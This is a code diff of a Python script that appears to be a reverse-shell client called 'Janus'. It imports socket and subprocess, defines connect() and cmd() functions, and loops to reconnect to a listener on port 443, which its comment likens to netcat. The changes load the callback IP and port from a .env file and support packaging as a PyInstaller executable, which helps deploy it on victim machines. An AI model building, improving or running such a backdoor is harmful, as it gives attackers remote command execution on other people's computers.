@@ -1,10 +1,27 @@
 import os
+import sys
 import socket
 import subprocess
 from time import sleep
 
-IP = "127.0.0.1" # 
-PORT = 443 # Ou 444, porta padrão do netcat
+# Resolve path regardless of if running directly or as PyInstaller executable
+if getattr(sys, 'frozen', False):
+    application_path = os.path.dirname(sys.executable)
+else:
+    application_path = os.path.dirname(os.path.abspath(__file__))
+
+env_path = os.path.join(application_path, '.env')
+if os.path.exists(env_path):
+    with open(env_path, 'r') as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith('#'):
+                if '=' in line:
+                    key, value = line.split('=', 1)
+                    os.environ[key.strip()] = value.strip()
+
+IP = os.environ.get("JANUS_IP", "127.0.0.1")
+PORT = int(os.environ.get("JANUS_PORT", 443))
 
 
 def connect():
@@ -55,6 +72,7 @@ def cmd(c, data):
     except Exception as e: 
         print(f'CMD function error: {e}')
 
+
 if __name__ == '__main__':
     try:
         while True:
@@ -65,8 +83,8 @@ if __name__ == '__main__':
             else :
                 sleep(5)
 
-    except KeybardInterrupt:
-        print('Program stoped by the user')
+    except KeyboardInterrupt:
+        print('Program stopped by the user')
 
     except Exception as e:
         print(f'Error in main function: {e}')
